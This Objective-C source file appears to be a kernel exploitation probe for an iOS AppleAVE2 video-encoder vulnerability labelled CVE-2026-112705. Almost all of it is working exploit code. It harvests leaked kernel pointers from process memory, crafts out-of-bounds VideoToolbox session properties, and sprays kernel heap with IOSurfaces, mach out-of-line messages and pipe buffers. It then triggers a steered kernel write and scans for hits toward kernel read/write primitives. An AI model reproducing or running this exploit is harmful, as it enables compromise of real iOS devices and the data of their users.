#import "KPAuditAVESpriteModule.h"
#import <UIKit/UIKit.h>
#import "KPLog.h"
#import "KPVMScanPolicy.h"
#import <VideoToolbox/VideoToolbox.h>
#import <CoreVideo/CoreVideo.h>
#import <mach/mach.h>
#import <dlfcn.h>
#import <fcntl.h>
#import <unistd.h>

#ifndef F_SETPIPE_SZ
#define F_SETPIPE_SZ 73
#endif

// Hang fix (same class as H9): VTCompressionSessionCompleteFrames(kCMTimeInvalid)
// deadlocks forever on a fault-latched session - and the path-ii shots
// (NTL=16000/16463 in frameProperties) can latch exactly one. Bounded callback
// drain instead, Liza semantics: sink cleared before submission, break on fault.
static void SpriteAttsCB(void *refCon, void *src, OSStatus st, VTEncodeInfoFlags fl, CMSampleBufferRef sb) {
    NSMutableArray *sink = (__bridge NSMutableArray *)refCon;
    if (!sink) return;
    @synchronized (sink) {
        [sink addObject:[NSString stringWithFormat:@"cb st=%d", (int)st]];
    }
}
static void SpriteDrain(VTCompressionSessionRef s, NSMutableArray *sink, int expected, int timeoutMs) {
    if (!s || !sink || expected <= 0) return;
    int waited = 0, last = 0, idleMs = 0;
    while (waited < timeoutMs) {
        int now = 0;
        BOOL faulted = NO;
        @synchronized (sink) {
            now = (int)sink.count;
            if (now > 0) {
                NSString *tail = [sink lastObject];
                if (tail && ![tail hasPrefix:@"cb st=0"]) faulted = YES;
            }
        }
        if (now >= expected) break;
        if (faulted) break;
        if (now > 0 && now == last) { idleMs += 2; if (idleMs >= 30) break; }
        else idleMs = 0;
        last = now;
        usleep(2000);
        waited += 2;
    }
}

@interface KPAuditAVESpriteModule ()
@property (nonatomic, assign) int sprayCount;
@property (nonatomic, assign) uint32_t marker;
@property (nonatomic, assign) int ntl;
@property (nonatomic, copy) NSString *identifier;
@property (nonatomic, copy) NSString *title;
@property (nonatomic, copy) NSString *subtitle;
@property (nonatomic, copy) NSString *icon;
@property (nonatomic, assign) KPTestSection section;
@end

@implementation KPAuditAVESpriteModule

- (instancetype)initWithSprayCount:(int)count marker:(uint32_t)marker {
    return [self initWithSprayCount:count marker:marker ntl:16433];
}

- (instancetype)initWithSprayCount:(int)count marker:(uint32_t)marker ntl:(int)ntl {
    self = [super init];
    if (self) {
        _sprayCount = count;
        _marker = marker;
        _ntl = ntl;
        _identifier = (ntl == 16433)
            ? [NSString stringWithFormat:@"ave112705.sprite%d.armed", count]
            : [NSString stringWithFormat:@"ave112705.sprite%d.ntl%d.armed", count, ntl];
        _title = (ntl == 16433)
            ? [NSString stringWithFormat:@"AVE2 sprite x%d", count]
            : [NSString stringWithFormat:@"AVE2 sprite x%d (NTL=%d)", count, ntl];
        _subtitle = [NSString stringWithFormat:
                     @"CVE-2026-112705: raw EncoderUsage=1 + NTL=%d after spray (no 60/15 clamp)", ntl];
        _icon = @"square.grid.3x3.middle.filled";
        _section = KPTestSectionKernelProbes;
    }
    return self;
}

- (void)journal:(NSString *)line {
    NSString *path = [NSTemporaryDirectory() stringByAppendingPathComponent:@"kp-ave-sprite-journal.log"];
    NSFileHandle *fh = [NSFileHandle fileHandleForWritingAtPath:path];
    if (!fh) {
        [[NSFileManager defaultManager] createFileAtPath:path contents:nil attributes:nil];
        fh = [NSFileHandle fileHandleForWritingAtPath:path];
    }
    [fh seekToEndOfFile];
    [fh writeData:[[line stringByAppendingString:@"\n"] dataUsingEncoding:NSUTF8StringEncoding]];
    [fh synchronizeFile];
    [fh closeFile];
    [KPLog.shared appendFormat:@"[ave-sprite] %@", line];
}

- (VTCompressionSessionRef)makeSessionWidth:(int)w height:(int)h {
    VTCompressionSessionRef session = NULL;
    OSStatus s = VTCompressionSessionCreate(kCFAllocatorDefault, w, h,
                                            kCMVideoCodecType_HEVC,
                                            NULL, NULL, NULL,
                                            NULL, NULL, &session);
    return (s == noErr) ? session : NULL;
}

- (CVPixelBufferRef)makeBufferWidth:(int)w height:(int)h {
    CVPixelBufferRef pb = NULL;
    CVPixelBufferCreate(kCFAllocatorDefault, w, h,
                        kCVPixelFormatType_420YpCbCr8BiPlanarVideoRange,
                        NULL, &pb);
    if (pb) {
        CVPixelBufferLockBaseAddress(pb, 0);
        memset(CVPixelBufferGetBaseAddressOfPlane(pb, 0), 0x40,
               CVPixelBufferGetBytesPerRowOfPlane(pb, 0) * (size_t)h);
        memset(CVPixelBufferGetBaseAddressOfPlane(pb, 1), 0x80,
               CVPixelBufferGetBytesPerRowOfPlane(pb, 1) * ((size_t)h / 2));
        CVPixelBufferUnlockBaseAddress(pb, 0);
    }
    return pb;
}

#pragma mark - Report

- (NSString *)runReport {
    NSMutableString *report = [NSMutableString string];
    [report appendString:@"=== KexProofV4 · CVE-2026-112705 · AVE2 sprite probe ===\n"];
    [report appendString:@"Weaponization question: does the OOB read consume SHAPED memory?\n"];
    [report appendString:@"Oracle: after the victim's panic, far/x0 shows what was read.\n"];
    [report appendString:@"  far=0x59               -> spray missed (baseline signature)\n"];
    [report appendString:@"  far low dword = 0x59 with high dword = marker bits -> partial hit\n"];
    [report appendString:@"  far contains marker 0x{marker} -> neighbour is OURS, pointer ours.\n"];
    [report appendString:@"Order: victim session FIRST, spray AFTER (OOB reads forward),\n"];
    [report appendString:@"       then encode the victim (NTL=16463 => may reboot the device).\n"];
    [report appendFormat:@"Target: iOS %@ uid=%d\n", UIDevice.currentDevice.systemVersion, getuid()];
    [report appendFormat:@"marker=0x%08x spray=%d\n", self.marker, self.sprayCount];

    const int32_t W = 1280, H = 720;
    const int32_t sw = 64, sh = 64;

    // 0) Pre-scan userspace RW memory for live ZONE_HEAP kernel pointers (e.g. 0xffffffee4e806580,
    //    0xfffffe2673806580) so we can steer NTL directly into the live kernel heap band!
    uint64_t liveKPtrs[8] = {0};
    int liveKPtrCount = 0;
    {
        vm_address_t addr = 0;
        vm_size_t size = 0;
        uint32_t depth = 0;
        vm_region_submap_info_data_64_t info;
        mach_msg_type_number_t count = VM_REGION_SUBMAP_INFO_COUNT_64;
        uint64_t pageBuf[512];
        vm_address_t exclAddrs[2] = { (vm_address_t)pageBuf, (vm_address_t)liveKPtrs };
        vm_size_t exclSizes[2] = { sizeof(pageBuf), sizeof(liveKPtrs) };
        for (int iter = 0; iter < 2048 && liveKPtrCount < 8; iter++) {
            count = VM_REGION_SUBMAP_INFO_COUNT_64;
            if (vm_region_recurse_64(mach_task_self(), &addr, &size, &depth,
                                     (vm_region_recurse_info_t)&info, &count) != KERN_SUCCESS || size == 0) {
                break;
            }
            if (info.is_submap) { depth++; continue; }
            if ((info.protection & (VM_PROT_READ | VM_PROT_WRITE)) == (VM_PROT_READ | VM_PROT_WRITE) &&
                size <= 16 * 1024 * 1024 &&
                !KPVMShouldSkipRegion(&info, addr, size, &depth, exclAddrs, exclSizes, 2)) {
                for (vm_size_t off = 0; off + sizeof(pageBuf) <= size && liveKPtrCount < 8; off += sizeof(pageBuf)) {
                    vm_size_t outSz = 0;
                    if (vm_read_overwrite(mach_task_self(), addr + off, sizeof(pageBuf),
                                          (vm_address_t)pageBuf, &outSz) != KERN_SUCCESS ||
                        outSz < sizeof(uint64_t)) {
                        break;
                    }
                    size_t words = outSz / sizeof(uint64_t);
                    for (size_t w = 0; w < words && liveKPtrCount < 8; w++) {
                        uint64_t v = pageBuf[w];
                        if (w + 1 < words && pageBuf[w + 1] == 0x000000000000beefULL) continue;
                        if (KPIsKernelPointerCandidate(v) && !KPIsKnownDiagnosticConstant(v)) {
                            BOOL dup = NO;
                            for (int k = 0; k < liveKPtrCount; k++) {
                                if ((liveKPtrs[k] >> 32) == (v >> 32)) { dup = YES; break; }
                            }
                            if (!dup) liveKPtrs[liveKPtrCount++] = v;
                        }
                    }
                }
            }
            if (addr + size <= addr) break;
            addr += size;
        }
    }

    int ntl = self.ntl;
    if (ntl <= 0 && liveKPtrCount > 0) {
        int32_t hiSigned = (int32_t)(uint32_t)(liveKPtrs[0] >> 32);
        ntl = 16463 + hiSigned;
    } else if (ntl <= 0) {
        ntl = 16433; // 0xffffffe200000059 (.DATA zone)
    }
    uint64_t steeredX0 = ((uint64_t)(uint32_t)(ntl - 16463) << 32) | 0x59ULL;

    // Include live discovered ZONE_HEAP bands first, then T8122/T8130 Zone map
    // (.DATA 0xffffffe1..0xffffffe2, .GEN0..3 0xffffffde..0xffffffe1, KMA 0xffffffe4).
    uint64_t x0cands[16];
    int ncand = 0;
    x0cands[ncand++] = steeredX0;
    for (int lk = 0; lk < liveKPtrCount && ncand < 16; lk++) {
        uint64_t liveSteered = (liveKPtrs[lk] & 0xffffffff00000000ULL) | 0x59ULL;
        if (liveSteered != steeredX0) x0cands[ncand++] = liveSteered;
    }
    const uint32_t hiBands[] = {
        0xFFFFFFE2u, 0xFFFFFFE1u, 0xFFFFFFE0u, 0xFFFFFFDFu, 0xFFFFFFDEu, 0xFFFFFFE4u,
        0xFFFFFFEEu, 0xFFFFFFEDu, 0xFFFFFFEFu,
        0xFFFFFE26u, 0xFFFFFE10u, 0xFFFFFE20u, 0xFFFFFE30u, 0xFFFFFE33u
    };
    for (size_t bi = 0; bi < sizeof(hiBands) / sizeof(hiBands[0]) && ncand < 16; bi++) {
        uint64_t cand = ((uint64_t)hiBands[bi] << 32) | 0x59ULL;
        BOOL exists = NO;
        for (int c = 0; c < ncand; c++) {
            if (x0cands[c] == cand) { exists = YES; break; }
        }
        if (!exists) x0cands[ncand++] = cand;
    }
    [report appendFormat:@"live ZONE_HEAP bands found: %d\n", liveKPtrCount];
    for (int lk = 0; lk < liveKPtrCount; lk++) {
        int lntl = 16463 + (int32_t)(uint32_t)(liveKPtrs[lk] >> 32);
        [report appendFormat:@"  live[%d] = 0x%016llx -> steeredNTL=%d (x0=0x%016llx)\n",
         lk, liveKPtrs[lk], lntl, (liveKPtrs[lk] & 0xffffffff00000000ULL) | 0x59ULL];
    }
    [report appendFormat:@"target NTL=%d steered_x0=0x%016llx\n", ntl, steeredX0];
    [report appendString:@"x0 candidates in spray:\n"];
    for (int c = 0; c < ncand; c++) {
        [report appendFormat:@"  cand[%d] = 0x%016llx\n", c, x0cands[c]];
    }

    // 1) VICTIM session created BEFORE spray; for NTL < 16463 omit PropertyMode=1
    //    and PrepareToEncodeFrames (which rejects NTL<16463 with -17691 and resets
    //    POST=1), using raw EncoderUsage=1 + RealTime=NO + NumberOfTemporalLayers.
    VTCompressionSessionRef victim = NULL;
    NSMutableArray *vSink = [NSMutableArray array];
    CFTypeRef retainedVSink = CFRetain((__bridge CFTypeRef)vSink);
    OSStatus vst = VTCompressionSessionCreate(kCFAllocatorDefault, W, H,
                                              kCMVideoCodecType_HEVC,
                                              NULL, NULL, NULL,
                                              SpriteAttsCB, (void *)retainedVSink, &victim);
    if (vst != noErr || !victim) {
        CFRelease(retainedVSink);
        [report appendString:@"\nVERDICT: VICTIM_SESSION_FAILED\n"];
        return report;
    }
    OSStatus pmSt = 0;
    OSStatus uSt = VTSessionSetProperty(victim, CFSTR("EncoderUsage"), (__bridge CFNumberRef)@1);
    OSStatus privNSt = 0;
    if (ntl >= 16463) {
        pmSt = VTSessionSetProperty(victim, CFSTR("PropertyMode"), (__bridge CFNumberRef)@1);
        privNSt = VTSessionSetProperty(victim, CFSTR("NumOfTemporalLayer"), (__bridge CFNumberRef)@(ntl));
    }
    OSStatus nSt = VTSessionSetProperty(victim, CFSTR("NumberOfTemporalLayers"), (__bridge CFNumberRef)@(ntl));
    int vrbPre = -1, vrbPost = -1;
    CFNumberRef vbn = NULL;
    if (VTSessionCopyProperty(victim, CFSTR("NumberOfTemporalLayers"), NULL, &vbn) == noErr && vbn) {
        CFNumberGetValue(vbn, kCFNumberIntType, &vrbPre);
        CFRelease(vbn);
    }
    OSStatus vPrep = (ntl >= 16463) ? VTCompressionSessionPrepareToEncodeFrames(victim) : 0;
    vbn = NULL;
    if (VTSessionCopyProperty(victim, CFSTR("NumberOfTemporalLayers"), NULL, &vbn) == noErr && vbn) {
        CFNumberGetValue(vbn, kCFNumberIntType, &vrbPost);
        CFRelease(vbn);
    }
    [self journal:[NSString stringWithFormat:@"VICTIM_CREATED session=%p ntl=%d pm=%d usage=%d privSet=%d set=%d pre=%d prep=%d post=%d",
                   (void *)victim, ntl, (int)pmSt, (int)uSt, (int)privNSt, (int)nSt, vrbPre, (int)vPrep, vrbPost]];
    [report appendFormat:@"victim session created (%p) before spray: pm=%d usage=%d privSet=%d NTL_set(%d)=%d PRE=%d prep=%d POST=%d\n",
     (void *)victim, (int)pmSt, (int)uSt, (int)privNSt, ntl, (int)nSt, vrbPre, (int)vPrep, vrbPost];

    // 2) SPRAY siblings — arm with PropertyMode=1, EnableUserRefForFacetime=YES,
    //    UserDPBFramesForFaceTime (34 int32s including OOB pair #16 carrying x0cands),
    //    and UserRPSForFaceTime (inner OOB 24 + outer OOB arr5 into pINS+0x1406c..).
    int32_t marker = (int32_t)self.marker;
    NSMutableArray *siblings = [NSMutableArray array];
    for (int i = 0; i < self.sprayCount; i++) {
        VTCompressionSessionRef s = [self makeSessionWidth:sw height:sh];
        if (!s) continue;
        uint64_t cand64 = x0cands[i % ncand];
        uint32_t cLo = (uint32_t)(cand64 & 0xffffffffULL);
        uint32_t cHi = (uint32_t)(cand64 >> 32);
        VTSessionSetProperty(s, CFSTR("PropertyMode"), (__bridge CFNumberRef)@1);
        VTSessionSetProperty(s, CFSTR("EnableUserRefForFacetime"), kCFBooleanTrue);
        VTSessionSetProperty(s, CFSTR("EncoderUsage"), (__bridge CFNumberRef)@1);
        VTSessionSetProperty(s, CFSTR("NumberOfTemporalLayers"), (__bridge CFNumberRef)@3);
        VTSessionSetProperty(s, CFSTR("MaxKeyFrameInterval"), (__bridge CFNumberRef)@(marker));
        VTSessionSetProperty(s, CFSTR("AverageBitRate"), (__bridge CFNumberRef)@(marker));
        VTSessionSetProperty(s, CFSTR("ExpectedFrameRate"), (__bridge CFNumberRef)@(marker));
        VTSessionSetProperty(s, CFSTR("MaxKeyFrameIntervalDuration"), (__bridge CFNumberRef)@(marker));

        NSMutableArray *dpb34 = [NSMutableArray arrayWithCapacity:34];
        for (int p = 0; p < 17; p++) {
            [dpb34 addObject:@((int32_t)cLo)];
            [dpb34 addObject:@((int32_t)cHi)];
        }
        VTSessionSetProperty(s, CFSTR("UserDPBFramesForFaceTime"), (__bridge CFTypeRef)dpb34);

        NSMutableArray *s0Oob24 = [NSMutableArray arrayWithCapacity:24];
        NSMutableArray *s1Oob24 = [NSMutableArray arrayWithCapacity:24];
        for (int k = 0; k < 24; k++) {
            int16_t hval = (int16_t)((k & 1) ? (cHi & 0xffff) : (cLo & 0xffff));
            [s0Oob24 addObject:@(hval)];
            [s1Oob24 addObject:@(hval)];
        }
        NSDictionary *rpsOob = @{
            @"InterRefPicSetPredictionFlag": (id)kCFBooleanFalse,
            @"NumNegativePics": @2,
            @"NumPositivePics": @2,
            @"DeltaPOCS0Minus1": s0Oob24,
            @"UsedByCurrPicS0Flag": @3,
            @"DeltaPOCS1Minus1": s1Oob24,
            @"UsedByCurrPicS1Flag": @3,
        };
        VTSessionSetProperty(s, CFSTR("UserRPSForFaceTime"),
                             (__bridge CFTypeRef)@[ rpsOob, rpsOob, rpsOob, rpsOob, rpsOob ]);

        if ((i & 1) == 0) {
            int64_t pv = (int64_t)cand64;
            VTSessionSetProperty(s, CFSTR("AverageBitRate"), (__bridge CFNumberRef)@(pv));
            VTSessionSetProperty(s, CFSTR("MaxKeyFrameInterval"), (__bridge CFNumberRef)@(pv));
        }
        VTCompressionSessionPrepareToEncodeFrames(s);
        [siblings addObject:[NSValue valueWithPointer:s]];
    }
    [self journal:[NSString stringWithFormat:@"SPRAY_DONE n=%d marker=0x%08x ntl=%d",
                   (int)siblings.count, self.marker, ntl]];

    // Dense fixed-page spray (strategy doc): own the pages at 0xfffffeXX00000059
    // so a steered write lands in OUR buffers and can be scanned afterwards.
    typedef void *(*SpriteISCreateFn)(CFDictionaryRef);
    typedef int (*SpriteISLockFn)(void *, uint32_t, uint32_t *);
    typedef int (*SpriteISUnlockFn)(void *, uint32_t, uint32_t *);
    typedef void *(*SpriteISGetBaseFn)(void *);
    typedef size_t (*SpriteISGetSizeFn)(void *);
    void *isLib = dlopen("/System/Library/Frameworks/IOSurface.framework/IOSurface", RTLD_LAZY);
    SpriteISCreateFn sIsCreate = isLib ? (SpriteISCreateFn)dlsym(isLib, "IOSurfaceCreate") : NULL;
    SpriteISLockFn sIsLock = isLib ? (SpriteISLockFn)dlsym(isLib, "IOSurfaceLock") : NULL;
    SpriteISUnlockFn sIsUnlock = isLib ? (SpriteISUnlockFn)dlsym(isLib, "IOSurfaceUnlock") : NULL;
    SpriteISGetBaseFn sIsGetBase = isLib ? (SpriteISGetBaseFn)dlsym(isLib, "IOSurfaceGetBaseAddress") : NULL;
    SpriteISGetSizeFn sIsGetSize = isLib ? (SpriteISGetSizeFn)dlsym(isLib, "IOSurfaceGetAllocSize") : NULL;
    CFMutableArrayRef surfArray = NULL;
    if (sIsCreate && sIsLock && sIsUnlock && sIsGetBase && sIsGetSize) {
        surfArray = CFArrayCreateMutable(kCFAllocatorDefault, 0, &kCFTypeArrayCallBacks);
        for (int s = 0; s < 96; s++) {
            NSDictionary *props = @{
                @"IOSurfaceWidth": @1024, @"IOSurfaceHeight": @2048,
                @"IOSurfaceBytesPerElement": @4, @"IOSurfacePixelFormat": @0x42475241,
            };
            void *surf = sIsCreate((__bridge CFDictionaryRef)props);
            if (surf) { CFArrayAppendValue(surfArray, surf); CFRelease(surf); }
        }
    }
    [report appendFormat:@"fixed-page spray: %ld surfaces\n",
     surfArray ? (long)CFArrayGetCount(surfArray) : 0L];

    // === Kernel-object spray (strategy doc): objects whose METADATA lives in
    // kheap — OOL data copies (ipc kalloc), pipe buffers. Content is tiled with
    // the marker pair so a landed stp write ([x0, x0, x0, 0]) stands out.
    uint64_t markerPair = ((uint64_t)(uint32_t)self.marker << 32) | (uint32_t)self.marker;
    uint8_t *tile = (uint8_t *)malloc(256 * 1024);
    if (tile) {
        uint64_t *tq = (uint64_t *)tile;
        for (size_t ti = 0; ti < 256 * 1024 / 8; ti++) tq[ti] = markerPair;
    }
    mach_port_t oolPorts[64];
    int oolPortCount = 0, oolQueued = 0;
    for (int p = 0; p < 64; p++) {
        oolPorts[p] = MACH_PORT_NULL;
        if (mach_port_allocate(mach_task_self(), MACH_PORT_RIGHT_RECEIVE, &oolPorts[p]) != KERN_SUCCESS) continue;
        mach_port_insert_right(mach_task_self(), oolPorts[p], oolPorts[p], MACH_MSG_TYPE_MAKE_SEND);
        oolPortCount++;
    }
    if (tile && oolPortCount) {
        for (int p = 0; p < oolPortCount; p++) {
            for (int m = 0; m < 4; m++) {
                size_t total = sizeof(mach_msg_header_t) + sizeof(mach_msg_body_t) + sizeof(mach_msg_ool_descriptor_t);
                uint8_t *msg = calloc(1, total);
                mach_msg_header_t *hdr = (mach_msg_header_t *)msg;
                hdr->msgh_bits = MACH_MSGH_BITS(MACH_MSG_TYPE_COPY_SEND, 0) | MACH_MSGH_BITS_COMPLEX;
                hdr->msgh_size = (mach_msg_size_t)total;
                hdr->msgh_remote_port = oolPorts[p];
                hdr->msgh_local_port = MACH_PORT_NULL;
                hdr->msgh_id = 0x5350;
                mach_msg_body_t *body = (mach_msg_body_t *)(msg + sizeof(mach_msg_header_t));
                body->msgh_descriptor_count = 1;
                mach_msg_ool_descriptor_t *od =
                    (mach_msg_ool_descriptor_t *)(msg + sizeof(mach_msg_header_t) + sizeof(mach_msg_body_t));
                od->address = tile;
                od->size = 256 * 1024;
                od->deallocate = 0;
                od->copy = MACH_MSG_PHYSICAL_COPY;
                od->type = MACH_MSG_OOL_DESCRIPTOR;
                kern_return_t okr = mach_msg((mach_msg_header_t *)msg, MACH_SEND_MSG | MACH_SEND_TIMEOUT,
                                             (mach_msg_size_t)total, 0, MACH_PORT_NULL, 50, MACH_PORT_NULL);
                if (okr == KERN_SUCCESS) oolQueued++;
                free(msg);
            }
        }
    }
    [report appendFormat:@"ool kernel-copy spray: %d ports, %d queued x 256KB\n", oolPortCount, oolQueued];

    int pipeFds[48][2];
    int pipesMade = 0;
    for (int p = 0; p < 48; p++) {
        pipeFds[p][0] = pipeFds[p][1] = -1;
        if (pipe(pipeFds[p]) != 0) continue;
        fcntl(pipeFds[p][1], F_SETPIPE_SZ, 256 * 1024); // ignored if unsupported
        fcntl(pipeFds[p][1], F_SETFL, O_NONBLOCK);
        if (tile && write(pipeFds[p][1], tile, 256 * 1024) > 0) pipesMade++;
    }
    [report appendFormat:@"pipe spray: %d x 256KB\n", pipesMade];

    // 3) FIRE FIRST ENCODE AND TEARDOWN VICTIM BEFORE SCANNING SPRAY
    //    Confirmed by static RE (AVE-112705-EXPLOIT.md Section 4):
    //    The 28-byte self-fill (stp x0,x0,[x0]; str x0,[x0,#0x10]; str wzr,[x0,#0x18]
    //    at 0xfffffff008579420) executes during AppleAVE2 slot teardown
    //    (0xfffffff0085df654 -> 0xfffffff00868f48c -> 0xfffffff00868f28c).
    //    Therefore we MUST invalidate/release `victim` BEFORE scanning and freeing
    //    the IOSurface / OOL / pipe spray!
    CVPixelBufferRef pb = [self makeBufferWidth:W height:H];
    [self journal:[NSString stringWithFormat:
                   @"BEFORE_VICTIM_ENCODE ntl=%d set=%d readback=%d x0=0x%016llx",
                   ntl, (int)nSt, vrbPost, steeredX0]];
    if (pb) {
        @synchronized (vSink) { [vSink removeAllObjects]; }
        OSStatus e0 = VTCompressionSessionEncodeFrame(victim, pb, CMTimeMake(0, 30), kCMTimeInvalid,
                                                      NULL, NULL, NULL);
        if (e0 == noErr) {
            SpriteDrain(victim, vSink, 1, 500);
        }
        NSString *cb0 = nil;
        @synchronized (vSink) { cb0 = vSink.firstObject ?: @"(no cb)"; }
        [report appendFormat:@"first-encode trigger (NTL=%d) -> %d (%@)\n", ntl, (int)e0, cb0];
        CVPixelBufferRelease(pb);
        pb = NULL;
    }

    // Trigger AppleAVE2 teardown (0xfffffff0085df654 -> stp x0,x0,[x0]) WHILE
    // all IOSurface / OOL / pipe buffers are still resident in kernel memory.
    VTCompressionSessionInvalidate(victim);
    CFRelease(victim);
    victim = NULL;
    CFRelease(retainedVSink);

    [self journal:[NSString stringWithFormat:@"AFTER_VICTIM_TEARDOWN survived ntl=%d — scanning spray for stp [x0,x0,x0,0]", ntl]];

    // Scan the fixed-page spray for the stp x0,x0,[x0] signature: the written
    // qwords equal x0 (steeredX0 / candidate) or the marker pair.
    if (surfArray) {
        long hits = 0;
        CFIndex scount = CFArrayGetCount(surfArray);
        for (CFIndex si = 0; si < scount; si++) {
            void *surf = (void *)CFArrayGetValueAtIndex(surfArray, si);
            uint32_t seed = 0;
            if (sIsLock(surf, 0, &seed) != 0) continue;
            uint8_t *base = (uint8_t *)sIsGetBase(surf);
            size_t sz = sIsGetSize(surf);
            if (base && sz >= 32) {
                for (size_t off = 0; off + 32 <= sz; off += 8) {
                    uint64_t q = *(uint64_t *)(base + off);
                    if (q == 0) continue;
                    int match = -1;
                    for (int c = 0; c < ncand; c++) {
                        if (q == x0cands[c]) { match = c; break; }
                    }
                    if (match < 0 && (uint32_t)q == 0x59u) match = 59;
                    uint64_t mPair = ((uint64_t)(uint32_t)marker << 32) | (uint32_t)marker;
                    if (match < 0 && q == mPair) match = 100 + (int)(q & 0xff);
                    if (match >= 0) {
                        uint64_t q2 = *(uint64_t *)(base + off + 8);
                        uint32_t z = *(uint32_t *)(base + off + 0x18);
                        [report appendFormat:@"    SURFACE HIT surf=%ld off=0x%zx q=0x%llx q2=0x%llx z=0x%x match=%d\n",
                         (long)si, off, q, q2, z, match];
                        hits++;
                        if (hits >= 8) break;
                    }
                }
            }
            sIsUnlock(surf, 0, &seed);
            if (hits >= 8) break;
        }
        [report appendFormat:@"fixed-page scan: %ld hit(s) in %ld surfaces\n", hits, (long)scount];
        CFRelease(surfArray);
    } else {
        [report appendString:@"fixed-page scan: skipped (IOSurface dlsym unavailable)\n"];
    }

    // Read back OOL queues and pipes: a landed stp write shows as the signature
    // [x0, x0, x0, 0] embedded in the marker-tiled content (or any non-marker mutation).
    int oolHits = 0, pipeHits = 0;
    for (int p = 0; p < oolPortCount; p++) {
        for (int m = 0; m < 4; m++) {
            size_t rtotal = sizeof(mach_msg_header_t) + sizeof(mach_msg_body_t) + sizeof(mach_msg_ool_descriptor_t) + 256;
            uint8_t *rcv = calloc(1, rtotal);
            if (!rcv) break;
            mach_msg_header_t *rh = (mach_msg_header_t *)rcv;
            rh->msgh_size = (mach_msg_size_t)rtotal;
            kern_return_t rkr = mach_msg(rh, MACH_RCV_MSG | MACH_RCV_TIMEOUT, 0,
                                         (mach_msg_size_t)rtotal, oolPorts[p], 10, MACH_PORT_NULL);
            if (rkr == KERN_SUCCESS) {
                mach_msg_ool_descriptor_t *od =
                    (mach_msg_ool_descriptor_t *)(rcv + sizeof(mach_msg_header_t) + sizeof(mach_msg_body_t));
                if (od->address && od->size >= 32) {
                    uint64_t *oq = (uint64_t *)od->address;
                    size_t nq = od->size / 8;
                    for (size_t i3 = 0; i3 + 4 < nq && oolHits < 8; i3++) {
                        if (oq[i3] != markerPair) {
                            [report appendFormat:@"    OOL HIT p=%d m=%d off=0x%zx q0=0x%llx q1=0x%llx q2=0x%llx q3=0x%llx\n",
                             p, m, i3 * 8, oq[i3], oq[i3 + 1], oq[i3 + 2], oq[i3 + 3]];
                            oolHits++;
                            i3 += 3;
                        }
                    }
                }
                if (od->address) {
                    vm_deallocate(mach_task_self(), (vm_address_t)od->address,
                                  (od->size + 4095) & ~(size_t)4095);
                }
            }
            free(rcv);
            if (oolHits >= 8) break;
        }
        if (oolHits >= 8) break;
    }
    for (int p = 0; p < 48; p++) {
        if (pipeFds[p][0] < 0) continue;
        uint8_t *pbuf = (uint8_t *)malloc(256 * 1024);
        if (pbuf) {
            ssize_t got = read(pipeFds[p][0], pbuf, 256 * 1024);
            if (got >= 32) {
                uint64_t *pq = (uint64_t *)pbuf;
                size_t nq = (size_t)got / 8;
                for (size_t i3 = 0; i3 + 4 < nq && pipeHits < 8; i3++) {
                    if (pq[i3] != markerPair) {
                        [report appendFormat:@"    PIPE HIT p=%d off=0x%zx q0=0x%llx q1=0x%llx q2=0x%llx q3=0x%llx\n",
                         p, i3 * 8, pq[i3], pq[i3 + 1], pq[i3 + 2], pq[i3 + 3]];
                        pipeHits++;
                        i3 += 3;
                    }
                }
            }
            free(pbuf);
        }
        close(pipeFds[p][0]);
        close(pipeFds[p][1]);
    }
    [report appendFormat:@"kernel-object scan: ool_hits=%d pipe_hits=%d\n", oolHits, pipeHits];
    for (int p = 0; p < oolPortCount; p++) {
        if (oolPorts[p] != MACH_PORT_NULL) mach_port_destroy(mach_task_self(), oolPorts[p]);
    }
    if (tile) free(tile);

    for (NSValue *v in siblings) {
        VTCompressionSessionInvalidate((VTCompressionSessionRef)v.pointerValue);
        CFRelease((VTCompressionSessionRef)v.pointerValue);
    }
    if (pb) CVPixelBufferRelease(pb);
    if (victim) {
        VTCompressionSessionInvalidate(victim);
        CFRelease(victim);
    }

    [report appendFormat:@"\nsessions_created=%d\n", (int)siblings.count];
    [report appendString:@"\nVERDICT: "];
    [report appendString:@"SEE_JOURNAL_AND_PANIC_FAR\n"];
    [report appendString:
     @"If the device panicked: pull panic-full and read far/x0.\n"
     @"  far=0x59 -> spray did not shape the OOB read; try a different object\n"
     @"             class (kalloc size matching the pInfo zone) or more volume.\n"
     @"  far != 0x59 -> OUR data was consumed. Compare against the marker to\n"
     @"             locate the exact field and lock the primitive.\n"
     @"Survived: check OOL/PIPE/SURFACE HIT lines — a [x0,x0,x0,0] signature is\n"
     @"  the steered write landing in our kernel objects (kread/kwrite seed).\n"];
    return report;
}

@end
